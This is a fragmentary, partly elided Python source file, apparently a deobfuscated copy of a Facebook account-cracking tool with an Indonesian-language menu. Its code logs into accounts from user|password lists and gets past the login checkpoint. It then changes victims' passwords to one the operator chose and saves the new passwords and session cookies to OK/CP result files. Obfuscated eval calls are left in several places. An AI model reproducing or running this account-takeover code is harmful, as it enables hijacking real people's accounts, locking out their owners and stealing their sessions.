# Deobfuscated by Exotic-Hridoy
# reversed : https://github.com/Luffy-XD/Haki-Fb
...
def licensi():
	CetakBanner(f"""[green]
   __    ____  ___  ____  _  _  ___  ____
  (  )  (_  _)/ __)( ___)( \( )/ __)(_  _)
   )(__  _)(_( (__  )__)  )  ( \__ \ _)(_
  (____)(____)\___)(____)(_)\_)(___/(____)
""","color(8)")
class Logo:
...
class Crack:
	...
	def simpan_hasil(self):
		prints(Panel(f"""\r     {P2}hasil crack {U2}ok{P2} tersimpan ke : {U2}OK/{self.hari_ini}.txt{P2}
{P2}     hasil crack {B2}cp {P2}tersimpan ke : {B2}CP/{self.hari_ini}.txt{P2}""",width=87,padding=(0,10),style=f"{color_panel}"))
		prints(Panel(f"""\r     {P2}Jika Tidak Ada Hasil Hidupkan Mode Pesawat 5 Detik {U2}!!!""",width=87,padding=(0,10),style=f"{color_panel}"))
class Lain:
	def __init__(self,cookie):
		self.cookie=cookie
		self.file=[]
		self.listfile=[]
	def menu(self):
		prints(Panel(f"""{P2}[{U2}01{P2}]. {B2}lihat {AA}akun {U2}hasil crack  {P2}[{U2}04{P2}]. {B2}ganti {AA}warna {U2}tema tools
{P2}[{U2}02{P2}]. {B2}get info {AA}akun {U2}target    {P2}[{U2}05{P2}]. {B2}tampilkan {AA}info {U2}cookies
{P2}[{U2}03{P2}]. {B2}setting {AA}user {U2}agent      {P2}[{U2}06{P2}].{B2} Kembali {P2})""",width=87,padding=(0,7),style=f"{color_panel}"))
		menu=console.input(f" {U2}# {P2}pilih menu : ")
		if menu in["01","1"]:
			self.cek_hasil()
		elif menu in["04","4"]:
			...
			exit(prints(Panel(f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",width=87,style=f"{color_panel}")))
	def cek_hasil(self):
		prints(Panel(f"""{P2}[{U2}01{P2}]. {B2}lihat akun {AA}hasil {U2}crack ok
[{U2}02{P2}]. {B2}lihat akun {AA}hasil {U2}crack cp""",width=87,padding=(0,20),style=f"{color_panel}"))
		...
		for fil in dirs:
			...
			self.listfile.append(Panel(f"{P2}[{color_text}0{num}{P2}]",width=10,title=f"{P2}nomer",style=eval(XWWWXXXWWXXXXXWWWX(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
			self.listfile.append(Panel(f"{P2}{fil}",width=35,title=f"{P2}tanggal",style=eval(XWWWXXXWWXXXXXWWWX(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
			self.listfile.append(Panel(f"{P2}{len(totalakun)} akun",width=28,title=f"{P2}total akun",style=eval(XWWWXXXWWXXXXXWWWX(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
...
def opsi():
	CP=("CP/")
	romi=console.input(f" {U2}# {P2}Tempel atau masukan nama file yang ingin di cek disini : ")
	if romi=="":
	...
	if pw in["y","Y"]:
		...
		if len(pw2)<=5:
			prints(Panel(f"""{P2}Sandi minimal 6 karakter""",width=87,style=f"{color_panel}"))
		else:
			pwbaru.append(pw2)
	...
	for fb in file_cp:
		...
		ngecek=akun.split("|")
		nomor+=1
		prints(Panel(f"""{P2}[{H2}{(str(nomor))}{P2}] {P2}Cek sesi akun {B2}>=> {B2}{akun}""",width=87,style=f"{color_panel}"));jeda(0.1)
		try:
...
def mengecek(user,pw):
	...
	if "c_user" in session.cookies.get_dict():
		...
		number=0
		print("\r%s%s [0m terdapat %s%s%s [0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					...
					if "Buat Kata Sandi Baru" in re.findall("\\<title>(.*?)<\\/title>",str(ubahPw)):
						...
						coki=(";").join(["%s=%s" %(key,value)for key,value in session.cookies.get_dict().items()])
						print("\r%s%s[0makun one tab, sandi berhasil di ubah \n OK %s%s%s|%s|%s\t\t\t"%(H,til,N,H,user,pwbaru[0],coki))
						open("OK/OK-%s.txt" %(waktu),"a").write("%s%s|%s|%s\n" %(H,user,pwbaru[0],coki))
				else:
					print("\r%s%s [0m[1;92mCheckpoint Terbuka, Akun Tap Yes Silahkan Login\t\t"%(H,til))
					tree=Tree(" ",guide_style=f"{color_ok}")
